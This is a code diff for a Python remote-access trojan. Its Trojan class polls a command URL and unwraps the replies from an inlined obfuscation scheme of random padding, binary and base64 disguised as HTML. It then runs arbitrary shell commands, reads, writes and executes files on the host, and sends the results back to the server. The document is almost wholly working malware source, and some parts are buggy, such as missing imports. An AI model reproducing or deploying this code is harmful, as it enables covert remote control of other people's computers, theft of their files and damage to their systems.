@@ -1,13 +1,48 @@
 import urllib.request as request
 import urllib.parse as parse
+from urllib.parse import quote, unquote
 
 import json
 import os
 import sys
+import random
+import base64
+import string
 
-sys.path.append("..")
-from Encryptor import *
+def encrypt(plaintext: str) -> str:
+    #add random charecters to plaintext- still no encryption
+    randomtext = ''
+    for i in range(len(plaintext)):
+        randomtext += plaintext[i]
+        randomtext += chr(random.randint(33, 126))
+    #convert randomtext to binary
+    binarytext = ''.join(format(ord(i), '08b') for i in randomtext)
+    binarytext = binarytext
+    #convert binary to base64
+    base64text = str(base64.b64encode(binarytext.encode('utf-8')))[2:-1] 
+    #adds random charecters to base64
+    randombase64text = ''
+    for i in range(len(str(base64text))):
+        randombase64text  += str(base64text)[i]
+        randombase64text  += chr(random.randint(33, 126))
+    html = ('<!doctype html><body>^%s^</body></doctype>' % randombase64text)
+    return html
 
+
+def decrypt(html : str) -> str:
+    #remove html
+    start = html.find('^') + 1
+    end = -(html[::-1].find('^') +1)
+    base64text = html[start:end]
+    #removes random charecters
+    base64text_norandom = base64text[::2]
+    #decode from base64
+    binarytext = base64.b64decode(base64text_norandom.encode('latin-1'))
+    #converts from binary to text
+    randomtext = ''.join(chr(int(binarytext[i*8:i*8+8],2)) for i in range(len(binarytext)//8))
+    #extract plaintext
+    plaintext = randomtext[::2]
+    return plaintext
 
 class Trojan:
     def __init__(self, commandurl,\
@@ -22,8 +57,11 @@ class Trojan:
     def commands(self) -> dict:
         req = request.Request(self.commandurl, headers = self.headers)
         with request.urlopen(req) as response:
-            encryptedresponse = response.read().decode()
+            encryptedresponse = response.read()
+            encryptedresponse = encryptedresponse.decode()
+        print(encryptedresponse)
         decryptedresponse = decrypt(encryptedresponse)
+        print(decryptedresponse)
         commands = ''
         try:
             commands = json.loads(decryptedresponse)
@@ -49,19 +87,16 @@ class Trojan:
         |file-run- run files on computer- input is [*files], output is [*[file name, errors]]
         """
         commands = self.commands()
-        print(commands)
-        outcomes = {'cmd' : [], 'file-read' : [], 'file-write' : [], 'file-run' : []}
         outcomes = {'cmd' : [], 'file-read' : [], 'file-write' : [], 'file-run' : []}
         for key, values in commands.items():
             if key.lower() == 'cmd':
                 for cmd in values: #just keeps running seemingly random values
-                    try:
-                        output = str(os.popen(cmd).read())
-                    except:
-                            try:
-                                output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
-                            except Exception as e:
-                                output = e
+                    output = str(os.popen(cmd).read())
+                    if output == -1 or output == 1:
+                        try:
+                            output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
+                        except Exception as e:
+                            output = e
                     outcomes['cmd'].append([ cmd, output])
             elif key.lower() == 'file-read':
                 for value in values:
@@ -98,11 +133,3 @@ class Trojan:
         print('sending...')
         self.sendoutcome(outcomes)
                     
-                    
-                    
-                    
-                
-            
-if __name__ == '__main__':  
-    trojan = Trojan('http://localhost:8000', computerid='dht-11')
-    trojan.run()
